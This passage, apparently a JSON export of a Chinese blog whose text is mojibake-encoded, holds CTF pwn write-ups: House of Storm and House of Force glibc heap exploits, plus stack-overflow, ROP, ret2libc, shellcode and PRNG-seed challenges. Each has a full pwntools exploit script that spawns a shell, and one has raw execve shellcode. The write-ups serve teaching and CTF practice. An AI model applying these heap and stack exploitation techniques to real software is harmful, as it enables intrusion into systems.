victim-\u0026gt;bk_nextsize = victim; } //#define mark_bin(m, i) ((m)-\u0026gt;binmap[idx2block (i)] |= idx2bit (i)) mark_bin(av, victim_index); //æŠŠvictimåŠ å…¥åˆ°çš„binçš„è¡¨ç¤ºä¸ºéç©º //æŠŠvictimåŠ å…¥åˆ°large binçš„é“¾è¡¨ä¸­ victim-\u0026gt;bk = bck; victim-\u0026gt;fd = fwd; fwd-\u0026gt;bk = victim; bck-\u0026gt;fd = victim; } åˆ©ç”¨æ–¹æ³• 1 æ§åˆ¶unsorted_chunkçš„bkä¸ºfake_chunk\n2 æ§åˆ¶largebin_chunkçš„bkå’Œbk_nextsizeåˆ†åˆ«ä¸ºfake_chunk+0x8å’Œfake_chunk-0x18-5\n3ç”³è¯·ä¸€ä¸ªå¤§å°ä¸º0x50çš„chunk(è¿™é‡Œå¤§å°æŒ‡nb)\n[BUU] 0ctf_2018_heapstorm2 ä»£ç åˆ†æ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 __int64 sub_BE6() { int i; // [rsp+8h] [rbp-18h] int fd; // [rsp+Ch] [rbp-14h] setvbuf(stdin, 0LL, 2, 0LL); setvbuf(_bss_start, 0LL, 2, 0LL); alarm(0x3Cu); puts( \u0026#34; __ __ _____________ __ __ ___ ____\\n\u0026#34; \u0026#34; / //_// ____/ ____/ | / / / / / | / __ )\\n\u0026#34; \u0026#34; / ,\u0026lt; / __/ / __/ / |/ / / / / /| | / __ |\\n\u0026#34; \u0026#34; / /| |/ /___/ /___/ /| / / /___/ ___ |/ /_/ /\\n\u0026#34; \u0026#34;/_/ |_/_____/_____/_/ |_/ /_____/_/ |_/_____/\\n\u0026#34;); puts(\u0026#34;===== HEAP STORM II =====\u0026#34;); if ( !mallopt(1, 0) ) exit(-1); if ( mmap(\u0026amp;unk_13370000, 0x1000uLL, 3, 34, -1, 0LL) != \u0026amp;unk_13370000 ) exit(-1); fd = open(\u0026#34;/dev/urandom\u0026#34;, 0); if ( fd \u0026lt; 0 ) exit(-1); if ( read(fd, \u0026amp;unk_13370800, 0x18uLL) != 24 ) exit(-1); close(fd); unk_13370818 = unk_13370810; for ( i = 0; i \u0026lt;= 15; ++i ) { *((_QWORD *)\u0026amp;unk_13370800 + 2 * i + 4) = xor1(\u0026amp;unk_13370800, 0LL); *((_QWORD *)\u0026amp;unk_13370808 + 2 * i + 4) = xor2(0x13370800LL, 0LL); } return 0x13370800LL; } initå‡½æ•°ç”¨äº†malloptå°†M_MXFASTç½®ä¸º0ï¼Œè¿™ä¸ªå˜é‡è¡¨ç¤ºä¸€ä¸ªé˜ˆå€¼ï¼Œæ­¤é˜ˆå€¼ä»¥ä¸‹çš„sizeåˆ†é…chunkçš„æ—¶å€™ä½¿ç”¨fastbinï¼Œå¦åˆ™ä¸ç”¨ã€‚è¿™é‡Œç½®ä¸º0ï¼Œè¡¨ç¤ºæ‰€æœ‰çš„chunkéƒ½ä¸èµ°fast bin,æ— è®ºæ˜¯åˆ†é…æˆ–æ˜¯é‡Šæ”¾ã€‚æ­¤å¤–ç¨‹åºä½¿ç”¨mmapåˆ†é…äº†ä¸€å—å†…å­˜åŒºåŸŸ0x13370000ï¼Œå¯è¯»å¯å†™ã€‚\nmap_addr[0]ã€map_addr[1]ã€map_addr[2]ä¸º/dev/urandomç”Ÿæˆçš„éšæœºæ•°ã€‚map_addr[3]=map_addr[2]\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 void __fastcall add(__int64 a1) { int i; // [rsp+10h] [rbp-10h] int v2; // [rsp+14h] [rbp-Ch] void *v3; // [rsp+18h] [rbp-8h] for ( i = 0; i \u0026lt;= 15; ++i ) { if ( !xor2(a1, *(_QWORD *)(16 * (i + 2LL) + a1 + 8)) ) { printf(\u0026#34;Size: \u0026#34;); v2 = getnum(); if ( v2 \u0026gt; 12 \u0026amp;\u0026amp; v2 \u0026lt;= 4096 ) { v3 = calloc(v2, 1uLL); if ( !v3 ) exit(-1); *(_QWORD *)(16 * (i + 2LL) + a1 + 8) = xor2(a1, v2); *(_QWORD *)(16 * (i + 2LL) + a1) = xor1(a1, v3); printf(\u0026#34;Chunk %d Allocated\\n\u0026#34;, (unsigned int)i); } else { puts(\u0026#34;Invalid Size\u0026#34;); } return; } } } add()å‡½æ•°ä»map_addr[4]å¼€å§‹å¯»æ‰¾ç©ºé—²ä½ç½®(xorå¯»æ‰¾)ï¼Œsizeè¦æ±‚å¤§äº12å°äº0x1001ï¼Œä½¿ç”¨callocï¼Œå› æ­¤ä¼šå°†å†…å­˜æ¸…é›¶ã€‚map_addr[i]å­˜æ”¾çš„æ˜¯sizeå’Œmap_addr[0]å¼‚æˆ–çš„å€¼ï¼Œmap_addr[i+1]å­˜æ”¾çš„æ˜¯chunk_addrå’Œmap_addr[1]å¼‚æˆ–çš„å€¼ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 int __fastcall edit(_QWORD *a1) { signed int v2; // [rsp+10h] [rbp-20h] int v3; // [rsp+14h] [rbp-1Ch] __int64 v4; // [rsp+18h] [rbp-18h] printf(\u0026#34;Index: \u0026#34;); v2 = getnum(); if ( (unsigned int)v2 \u0026gt; 0xF || !xor2((__int64)a1, a1[2 * v2 + 5]) ) return puts(\u0026#34;Invalid Index\u0026#34;); printf(\u0026#34;Size: \u0026#34;); v3 = getnum(); if ( v3 \u0026lt;= 0 || v3 \u0026gt; (unsigned __int64)(xor2((__int64)a1, a1[2 * v2 + 5]) - 12) ) return puts(\u0026#34;Invalid Size\u0026#34;); printf(\u0026#34;Content: \u0026#34;); v4 = xor1(a1, a1[2 * v2 + 4]); sub_1377(v4, v3); strcpy((char *)(v3 + v4), \u0026#34;HEAPSTORM_II\u0026#34;); return printf(\u0026#34;Chunk %d Updated\\n\u0026#34;, (unsigned int)v2); } editå‡½æ•°å­˜åœ¨off_by_oneæ¼æ´\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 int __fastcall delete(_QWORD *a1) { void *v2; // rax signed int v3; // [rsp+1Ch] [rbp-4h] printf(\u0026#34;Index: \u0026#34;); v3 = getnum(); if ( (unsigned int)v3 \u0026gt; 0xF || !xor2((__int64)a1, a1[2 * v3 + 5]) ) return puts(\u0026#34;Invalid Index\u0026#34;); // 1 v2 = (void *)xor1(a1, a1[2 * v3 + 4]); free(v2); a1[2 * v3 + 4] = xor1(a1, 0LL); a1[2 * v3 + 5] = xor2((__int64)a1, 0LL); return printf(\u0026#34;Chunk %d Deleted\\n\u0026#34;, (unsigned int)v3); } Deleteå‡½æ•°é‡Šæ”¾å †å—å¹¶å°†åŸä½ç½®ç½®ä¸ºmap_addr[0]å’Œmap_addr[1]\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 int __fastcall show(_QWORD *a1) { __int64 v2; // rbx __int64 v3; // rax signed int v4; // [rsp+1Ch] [rbp-14h] if ( (a1[3] ^ a1[2]) != 0x13377331LL ) return puts(\u0026#34;Permission denied\u0026#34;); printf(\u0026#34;Index: \u0026#34;); v4 = getnum(); if ( (unsigned int)v4 \u0026gt; 0xF || !xor2((__int64)a1, a1[2 * v4 + 5]) ) return puts(\u0026#34;Invalid Index\u0026#34;); printf(\u0026#34;Chunk[%d]: \u0026#34;, (unsigned int)v4); v2 = xor2((__int64)a1, a1[2 * v4 + 5]); v3 = xor1(a1, a1[2 * v4 + 4]); sub_14D4(v3, v2); return puts(word_180A); } showå‡½æ•°è¦å…ˆæ»¡è¶³map_addr[2] xor map_addr[3] == 0x13377331ï¼Œå¦åˆ™ä¸èƒ½è¾“å‡º\nåˆ©ç”¨æ€è·¯ æœ¬é¢˜çš„showå‡½æ•°éœ€è¦é€šè¿‡éªŒè¯æ‰èƒ½è§£é”ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¿®æ”¹mmap_addr[]çš„å†…å®¹ï¼Œåˆ©ç”¨house of stormå¯ä»¥å°†mmap_addrå½“åšä¸€ä¸ªchunkæ¥ç”³è¯·ï¼Œä»è€Œä¿®æ”¹å…¶ä¸­å†…å®¹\n1åˆ©ç”¨off_by_nullæ¼æ´æ„é€ 2ä¸ªchunk overlapï¼Œä¸€ä¸ªç”¨æ¥ä¿®æ”¹unsortedbin_chunkçš„bk,ä¸€ä¸ªç”¨æ¥ä¿®æ”¹largebin_chunkçš„bkå’Œbk_next_size\n2ä¿®æ”¹mmap_addr[0ã€1ã€2]ä¸º0ï¼Œmap_addr[3] = 0x13377331ï¼Œç»•è¿‡showæ£€æŸ¥\n3ä¿®æ”¹chunk0_content_addrä¸ºmmap_addrï¼Œä¹‹åå¯ä»¥é€šè¿‡edit(chunk0)æ§åˆ¶mmap_addr[]çš„æ‰€æœ‰å†…å®¹ï¼Œæ³„éœ²heap,libc,ä¿®æ”¹free_hookå³å¯\nexpå¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 from pwn import * context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;amd64\u0026#39;) libc=ELF(\u0026#39;/home/fuguang/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6\u0026#39;) #libc=ELF(\u0026#39;libc-2.23.so\u0026#39;) def add(size): p.sendline(\u0026#39;1\u0026#39;) p.recvuntil(\u0026#39;Size: \u0026#39;) assert(12 \u0026lt; size \u0026lt;= 0x1000) p.sendline(str(size)) p.recvuntil(\u0026#39;Command: \u0026#39;) def edit(idx, content): p.sendline(\u0026#39;2\u0026#39;) p.recvuntil(\u0026#39;Index: \u0026#39;) p.sendline(str(idx)) p.recvuntil(\u0026#39;Size: \u0026#39;) p.sendline(str(len(content))) p.recvuntil(\u0026#39;Content: \u0026#39;) p.send(content) p.recvuntil(\u0026#39;Command: \u0026#39;) def free(idx): p.sendline(\u0026#39;3\u0026#39;) p.recvuntil(b\u0026#39;Index: \u0026#39;) p.sendline(str(idx)) p.recvuntil(\u0026#39;Command: \u0026#39;) def show(idx): p.sendline(b\u0026#39;4\u0026#39;) p.recvuntil(b\u0026#39;Index: \u0026#39;) p.sendline(str(idx)) p.recvuntil(b\u0026#39;]:\u0026#39;) p.recv(1) addr=u64(p.recv(6).ljust(8,b\u0026#39;\\x00\u0026#39;)) return addr while True: p=process(\u0026#39;./pwn\u0026#39;) #p=remote(\u0026#39;node5.buuoj.cn\u0026#39;,28814) add(0x18)#0 add(0x508)#1 add(0x18)#2 edit(1,b\u0026#39;a\u0026#39;*0x4f0+p64(0x500)) add(0x18)#3 add(0x508)#4 add(0x18)#5 edit(4,b\u0026#39;a\u0026#39;*0x4f0+p64(0x500)) add(0x18)#6 free(1) edit(0,b\u0026#39;a\u0026#39;*(0x18-12)) add(0x18)#1 add(0x4d8)#7 free(1) free(2) add(0x38)#1 add(0x4e8)#2 free(4) edit(3,b\u0026#39;a\u0026#39;*(0x18-12)) add(0x18)# 4 add(0x4d8)#8 free(4) free(5) add(0x48)# 4 free(2) add(0x4e8) free(2) storage=0x13370000+0x800 fake_chunk=storage-0x20 pay1=p64(0)*2+p64(0)+p64(0x4f1) pay1+=p64(0)+p64(fake_chunk)#ä¿®æ”¹unsorted bin chunk bk edit(7,pay1) #ä¿®æ”¹large bin bk bk-\u0026gt;nextsize pay2=p64(0)*4+p64(0)+p64(0x4e1) pay2+=p64(0)+p64(fake_chunk+8) pay2+=p64(0)+p64(fake_chunk-0x18-0x5) edit(8,pay2) try: add(0x48)#2 except: p.close() continue pay3=p64(0)*5+p64(0x13377331)+p64(storage) edit(2,pay3) pay4=p64(0)*3+p64(0x13377331)+p64(storage)+p64(0x1000)#chunk0_Ptr,size pay4+=p64(0x133707e3)+p64(8)#chunk1_ptr,size edit(0,pay4) heap=show(1) #gdb.attach(p) print(hex(heap)) pay5=p64(0)*3+p64(0x13377331)+p64(storage)+p64(0x1000)#chunk0_Ptr,size pay5+=p64(heap+0x10)+p64(8) edit(0,pay5) libcbase=show(1)-0x3c4b78 print(hex(libcbase)) free_hook=libcbase+libc.sym[\u0026#39;__free_hook\u0026#39;] sys=libcbase+libc.sym[\u0026#39;system\u0026#39;] pay6=p64(0)*3+p64(0x13377331)+p64(storage)+p64(0x1000)#chunk0_Ptr,size pay6+=p64(free_hook)+p64(8) pay6+=p64(storage+0x50)+p64(8) pay6+=b\u0026#39;/bin/sh\\x00\u0026#39; edit(0,pay6) edit(1,p64(sys)) print(hex(free_hook)) #gdb.attach(p) p.sendline(\u0026#39;3\u0026#39;) p.recvuntil(b\u0026#39;Index: \u0026#39;) p.sendline(b\u0026#39;2\u0026#39;) p.interactive() break ","date":"2026-02-15T00:43:28+08:00","image":"http://localhost:1313/image/House_of_storm.jpg","permalink":"http://localhost:1313/p/house-of-stormbuu-0ctf_2018_heapstorm2/","title":"House of storm\u0026\u0026[BUU] 0ctf_2018_heapstorm2"},{"content":"ä»¥glibc2.23ä¸ºä¾‹\nåˆ©ç”¨æ¡ä»¶\nå¯ä»¥ä¿®æ”¹top chunkçš„sizeä½ å¯¹ç”³è¯·å †å—çš„å¤§å°æ²¡æœ‰æ£€æµ‹ åŸç†ï¼Œå…ˆä¿®æ”¹top chunkçš„sizeï¼Œç„¶åè®¡ç®—top chunkä¸ä»»æ„åœ°å€çš„ä½ç½®ï¼Œç”³è¯·ä¸€ä¸ªå¤§chunkï¼Œå°†top chunkåœ°å€æ”¹ä¸ºæˆ‘ä»¬è¦ä¿®æ”¹çš„åœ°å€é™„è¿‘ï¼Œç„¶åå†æ¬¡ç”³è¯·åˆé€‚å¤§å°chunkåå¯¹è¯¥chunkè¿›è¡Œä¿®æ”¹å°±è¡Œå®ç°ä»»æ„åœ°å€å†™\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 victim = av-\u0026gt;top; size = chunksize (victim); if ((unsigned long) (size) \u0026gt;= (unsigned long) (nb + MINSIZE)) { remainder_size = size - nb; remainder = chunk_at_offset (victim, nb); av-\u0026gt;top = remainder; set_head (victim, nb | PREV_INUSE | (av != \u0026amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; } ä¾‹é¢˜ BUUCTF\ngyctf_2020_force 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 void __fastcall __noreturn main(int a1, char **a2, char **a3) { __int64 v3; // rax char s[256]; // [rsp+10h] [rbp-110h] BYREF unsigned __int64 v5; // [rsp+118h] [rbp-8h] v5 = __readfsqword(0x28u); setbuf(stdin, 0LL); setbuf(stdout, 0LL); setbuf(stderr, 0LL); memset(s, 255, sizeof(s)); while ( 1 ) { memset(s, 255, sizeof(s)); puts(\u0026#34;1:add\u0026#34;); puts(\u0026#34;2:puts\u0026#34;); read(0, nptr, 0xFuLL); v3 = atol(nptr); if ( v3 == 1 ) { add(); } else if ( v3 == 2 ) { put(); } } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 unsigned __int64 add() { const void **i; // [rsp+0h] [rbp-120h] __int64 size; // [rsp+8h] [rbp-118h] char s[256]; // [rsp+10h] [rbp-110h] BYREF unsigned __int64 v4; // [rsp+118h] [rbp-8h] v4 = __readfsqword(0x28u); memset(s, 255, sizeof(s)); for ( i = (const void **)\u0026amp;unk_202080; *i; ++i ) ; if ( (char *)i - (char *)\u0026amp;unk_202080 \u0026gt; 39 ) exit(0); puts(\u0026#34;size\u0026#34;); read(0, nptr, 0xFuLL); size = atol(nptr); *i = malloc(size); if ( !*i ) exit(0); printf(\u0026#34;bin addr %p\\n\u0026#34;, *i); puts(\u0026#34;content\u0026#34;); read(0, (void *)*i, 0x50uLL); puts(\u0026#34;done\u0026#34;); return __readfsqword(0x28u) ^ v4; } glibc çš„ malloc åˆ†é…å†…å­˜æœ‰ä¸¤ç§æ ¸å¿ƒæ–¹å¼ï¼Œç”¨ é˜ˆå€¼ åŒºåˆ†ï¼šå½“ç”³è¯·chunkå¤§å°å°äºé˜ˆå€¼æ—¶ï¼Œé‡‡ç”¨brkåˆ†é…ï¼Œ ä»è¿›ç¨‹heapæ®µæ‰©å±•ï¼Œåœ°å€è¿ç»­ ï¼›å½“ç”³è¯·chunkå¤§å°å¤§äºé˜ˆå€¼æ—¶ï¼Œä½¿ç”¨mmapåˆ†é…ï¼Œ å‘å†…æ ¸ç”³è¯·ç‹¬ç«‹çš„å†…å­˜ï¼Œä¸libcbaseåç§»å›ºå®šï¼Œæ‰€ä»¥å¯ä»¥ç”¨æ¥æ³„éœ²libcbase\næå‰å°†/bin/shå†™å…¥topï¼Œç„¶ååˆ©ç”¨house of forceä¿®æ”¹malloc_hookä¸ºsystem,å†æ¬¡mallocæ—¶ä¼ å…¥binsh(sizeå€¼åŸæœ¬æˆ‘ä»¬ç»™çš„æ˜¯æ•°å€¼,ä¼šæŠŠè¿™ä¸ªæ•°å€¼ç»™ rdiï¼Œç°åœ¨ç»™çš„æ˜¯ top chunk åœ°å€ï¼Œç»™ rdi çš„å€¼å°±æ˜¯top chunk çš„å†…å®¹)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 from pwn import* context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;amd64\u0026#39;,os=\u0026#39;linux\u0026#39;) p=process(\u0026#39;./pwn\u0026#39;) #p=remote(\u0026#39;node5.buuoj.cn\u0026#39;,25688) elf=ELF(\u0026#39;./pwn\u0026#39;) #libc=ELF(\u0026#39;./libc-2.23.so\u0026#39;) libc=ELF(\u0026#39;/home/fuguang/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6\u0026#39;) def add(size,content): p.recvuntil(b\u0026#39;2:puts\u0026#39;) p.sendline(b\u0026#39;1\u0026#39;) p.sendlineafter(b\u0026#39;size\u0026#39;,str(size)) p.recvuntil(b\u0026#39;0x\u0026#39;) addr=int(p.recv(12),16) p.sendafter(b\u0026#39;content\u0026#39;,content) return addr libcbase=add(9999999999,b\u0026#39;a\u0026#39;*8)+0x2540beff0 print(hex(libcbase)) top = add(0x18,b\u0026#39;a\u0026#39;*0x10+b\u0026#39;/bin/sh\\x00\u0026#39;+p64(0xFFFFFFFFFFFFFFFF))+0x10 malloc_hook=libc.sym[\u0026#39;__malloc_hook\u0026#39;]+libcbase print(hex(malloc_hook)) system=libc.sym[\u0026#39;system\u0026#39;] print(hex(system)) offset = (malloc_hook-0x20)-top print(hex(offset)) addr=add(offset, b\u0026#39;aaa\u0026#39;) addr1=addr+offset log.success(\u0026#34;addr1 :\u0026#34;+hex(addr1)) system=libc.sym[\u0026#39;system\u0026#39;]+libcbase addr2=add(0x10,p64(system)) log.success(\u0026#34;addr2 :\u0026#34;+hex(addr2)) p.recvuntil(b\u0026#39;2:puts\u0026#39;) p.sendline(b\u0026#39;1\u0026#39;) gdb.attach(p) p.sendlineafter(b\u0026#39;size\u0026#39;,str(top)) p.interactive() å¦ä¸€ç§è§£æ³• ,one_gadget,reallocæŠ¬rsp,å…³äºreallocçš„è§£é‡Šå¦‚ä¸‹ https://blog.csdn.net/Invin_cible/article/details/123042819\nç¢ç¢å¿µï¼šç”±äºæœŸæœ«å‘¨å¤ä¹ åŸå› å¥½ä¹…è‡³å°‘ä¸€ä¸ªæœˆæ²¡å­¦pwnäº†ï¼Œæœ¬æ¥å¤ç°äº†XSWåˆèµ›æ²¡è§£å‡ºçš„é¢˜ä½†æ˜¯æ²¡æœ‰æ¥å¾—åŠå†™wp,åé¢å°½é‡æ‰¾æ—¶é—´ä¸ä¸Šï¼Œè™½ç„¶å¤§å­¦å¥½å¿™ä½†æ˜¯åŠ æ²¹åŠ æ²¹\n","date":"2026-02-02T00:43:28+08:00","image":"http://localhost:1313/image/House_of_force.jpg","permalink":"http://localhost:1313/p/house-of-forcegyctf_2020_force/","title":"House of force\u0026\u0026gyctf_2020_force"},{"content":"ezzzzz_overflow å¼€äº†NXä¿æŠ¤ï¼Œscanfå‡½æ•°å­˜åœ¨æ— é™æ ˆæº¢å‡ºï¼Œæœ‰åé—¨ï¼Œret2text\n1 2 3 4 5 6 7 8 9 10 from pwn import * #p=process(\u0026#39;./pwn\u0026#39;) p=remote(\u0026#39;192.168.248.1\u0026#39;,64762) context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;amd64\u0026#39;) p.recvuntil(b\u0026#39;you name?\u0026#39;) shell=0x4011b6 ret=0x4012AA pay=b\u0026#39;a\u0026#39;*(0x20+8)+p64(shell) p.sendline(pay) p.interactive() roprop æœ‰NXå’Œpie\n1 2 3 4 5 6 7 8 9 10 11 12 int __fastcall main(int argc, const char **argv, const char **envp) { __int64 buf[4]; // [rsp+0h] [rbp-20h] BYREF init(argc, argv, envp); printf(\u0026#34;welcome to xswctf!!\u0026#34;); memset(buf, 0, sizeof(buf)); puts(\u0026#34;here is a gift.\u0026#34;); printf(\u0026#34;%p\\n\u0026#34;, gift); read(0, buf, 0x50uLL); return 0; } ç»™äº†giftåœ°å€ç”¨æ¥ç»•è¿‡pie,æ²¡æœ‰åé—¨ï¼Œæœ‰systemplt,gadgetå’Œ/bin/shå­—ä¸²ï¼Œæ‰“rop\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 from pwn import * #p=process(\u0026#39;./pwn\u0026#39;) p=remote(\u0026#39;192.168.248.1\u0026#39;,54036) context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;amd64\u0026#39;) p.recvuntil(b\u0026#39;welcome to xswctf!!here is a gift.\u0026#39;) p.recvuntil(b\u0026#39;0x\u0026#39;) pie=int(p.recv(12),16)-0x4038 print(hex(pie)) sys=pie+0x1040 binsh=pie+0x4048 rdi=pie+0x11f4 ret=pie+0x1016 pay=b\u0026#39;a\u0026#39;*(0x20+8)+p64(ret)+p64(rdi)+p64(binsh)+p64(sys)+p64(0) p.sendline(pay) p.interactive() shellcodeçš„è‰ºæœ¯(å°é²œç‰ˆ) æ— NXæœ‰pie\n1 2 3 4 5 6 7 8 9 10 void vuln() { char buf[312]; // [rsp+0h] [rbp-140h] BYREF unsigned __int64 v1; // [rsp+138h] [rbp-8h] v1 = __readfsqword(0x28u); puts(\u0026#34;ä½ çŸ¥é“shellcodeæ˜¯ä»€ä¹ˆå—ï¼Œè¯•ç€ç¼–å†™ä½ è‡ªå·±çš„shellcodeå§\u0026#34;); read(0, buf, 0x12CuLL); __asm { jmp rsi } } ç¨‹åºå…ˆå‘bufä¸­æ•°æ®ç„¶åæ‰§è¡Œå…¶å†…å®¹ æ‰€ä»¥ret2shellcode\n1 2 3 4 5 6 7 8 from pwn import * #p=process(\u0026#39;./pwn\u0026#39;) p=remote(\u0026#39;192.168.248.1\u0026#39;,52425) context(log_level=\u0026#39;debug\u0026#39;, arch=\u0026#39;amd64\u0026#39;) shellcode = b\u0026#34;\\x6a\\x3b\\x58\\x99\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x52\\x53\\x54\\x5f\\x52\\x5e\\x0f\\x05\u0026#34; p.send(shellcode) p.interactive() æ•°å­—ç‚¸å¼¹bomb! ä¿æŠ¤å…¨å¼€\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 int __fastcall main(int argc, const char **argv, const char **envp) { unsigned int v3; // eax int v5; // [rsp+0h] [rbp-30h] BYREF int i; // [rsp+4h] [rbp-2Ch] int v7; // [rsp+8h] [rbp-28h] int v8; // [rsp+Ch] [rbp-24h] char buf[24]; // [rsp+10h] [rbp-20h] BYREF unsigned __int64 v10; // [rsp+28h] [rbp-8h] v10 = __readfsqword(0x28u); init(argc, argv, envp); v3 = time(0LL); srand(v3); v7 = rand() % 500; puts(\u0026#34;è®©æˆ‘ä»¬æ¥ç©æ•°å­—ç‚¸å¼¹å§!!!ä½†è¿™æ¬¡æ˜¯çŒœä¸­æœ‰å¥–å“¦~~~~\u0026#34;); printf(\u0026#34;è¯·è¾“å…¥ä½ çš„æ¸¸æˆID: \u0026#34;); v8 = read(0, buf, 0x14uLL); buf[v8 - 1] = 0; printf(buf); puts(\u0026#34;,æ¬¢è¿æ‚¨ï¼\u0026#34;); puts(\u0026#34;---------------------------------------------------\u0026#34;); puts(\u0026#34; æ¸¸æˆå¼€å§‹ \u0026#34;); for ( i = 0; i \u0026lt;= 2; ++i ) { printf(\u0026#34;çŒœçŒœæˆ‘çš„ç‚¸å¼¹æ˜¯ä»€ä¹ˆ(æç¤º----åœ¨[0,500)ä¸­å“¦)ï¼š \u0026#34;); __isoc99_scanf(\u0026amp;unk_214C, \u0026amp;v5); if ( v7 == v5 ) win(); if ( v7 \u0026gt; v5 ) puts(\u0026amp;byte_214F); if ( v7 \u0026lt; v5 ) puts(\u0026#34;å˜¶ï¼Œï¼Œå¤§äº†å‘¢\u0026#34;); } puts(\u0026#34;---------------------------------------------------\u0026#34;); puts(\u0026#34; æ¸¸æˆç»“æŸ \u0026#34;); puts(\u0026amp;byte_21B0); return 0; } æ˜¯ä¸€ä¸ªä¼ªéšæœºç»•è¿‡ é¢˜ç›®ç”¨äº†v3 = time(0LL); æ‰€ä»¥æˆ‘ä»¬çš„ç§å­ä¹Ÿè®¾ä¸ºå½“å‰æ—¶é—´å°±å¥½\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 from pwn import * import time import ctypes #p=process(\u0026#39;./pwn\u0026#39;) libc=ctypes.CDLL(\u0026#39;/lib/x86_64-linux-gnu/libc.so.6\u0026#39;) p=remote(\u0026#39;192.168.248.1\u0026#39;,59068) context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;amd64\u0026#39;) seed = int(time.time()) libc.srand(seed) p.recvuntil(b\u0026#39;ID: \u0026#39;) p.send(b\u0026#39;a\u0026#39;) ans=str(libc.rand() % 500) p.recvuntil(\u0026#39;ï¼š \u0026#39;) p.sendline(ans.encode()) p.interactive() Pikachu æ²¡æœ‰åé—¨ ä½†æ˜¯editå’Œaddéƒ½æœ‰æ ˆæº¢å‡ºï¼Œå¯ä»¥æ‰¾åˆ°pop rdi äºæ˜¯ret2libc,æˆ‘ç”¨çš„æ˜¯addå‡½æ•°\néœ€è¦æ³¨æ„çš„æ˜¯, è¯»å…¥payloadçš„æ—¶ä¼šè¦†ç›–v3ï¼Œæ‰€ä»¥payloadéœ€è¦ä¿è¯v3çš„å€¼ä¸å˜å¦‚\n1 pay1=b\u0026#39;a\u0026#39;*(0x110-4)+p32(0)+p64(0)+p64(rdi)+p64(putsgot)+p64(putsplt)+p64(addd) çš„p32(0)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 int add() { _QWORD *v0; // rax char buf[268]; // [rsp+0h] [rbp-110h] BYREF unsigned int v3; // [rsp+10Ch] [rbp-4h] BYREF puts(\u0026#34;input index:\u0026#34;); v3 = 0; __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;v3); if ( v3 \u0026lt; 0xA ) { if ( p[v3] ) { LODWORD(v0) = puts(\u0026#34;The element already exists in the array.\u0026#34;); } else { puts(\u0026#34;input content:\u0026#34;); read(0, buf, 0x200uLL); v0 = p; p[v3] = gift; } } else { LODWORD(v0) = puts(\u0026#34;Array out of bounds\u0026#34;); } return (int)v0; } from pwn import * #p=process(\u0026#39;./pwn\u0026#39;) libc=ELF(\u0026#39;./libc.so.6\u0026#39;) p=remote(\u0026#39;192.168.248.1\u0026#39;,52538) context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;amd64\u0026#39;) def add(idx,content): p.recvuntil(b\u0026#39;5.exit\u0026#39;) p.sendline(b\u0026#39;1\u0026#39;) p.recvuntil(b\u0026#39;input index:\u0026#39;) p.sendline(str(idx).encode()) p.recvuntil(b\u0026#39;input content:\u0026#39;) p.send(content) def edit(idx,content): p.recvuntil(b\u0026#39;5.exit\u0026#39;) p.sendline(b\u0026#39;2\u0026#39;) p.recvuntil(b\u0026#39;input index:\u0026#39;) p.sendline(str(idx).encode()) p.recvuntil(b\u0026#39;input content:\u0026#39;) p.send(content) def dele(idx): p.recvuntil(b\u0026#39;5.exit\u0026#39;) p.sendline(b\u0026#39;3\u0026#39;) p.recvuntil(b\u0026#39;input index:\u0026#39;) p.sendline(str(idx).encode()) rdi=0x4011cb putsgot=0x404000 putsplt=0x401030 main=0x40152d addd=0x401240 pay1=b\u0026#39;a\u0026#39;*(0x110-4)+p32(0)+p64(0)+p64(rdi)+p64(putsgot)+p64(putsplt)+p64(addd) #gdb.attach(p) add(0,pay1) p.recv(1) #-0x835a0 libcbase=u64(p.recv(6).ljust(8,b\u0026#39;\\x00\u0026#39;))-0x805a0 print(hex(libcbase)) #gdb.attach(p) sys=libcbase+libc.symbols[\u0026#39;system\u0026#39;] binsh = libcbase + 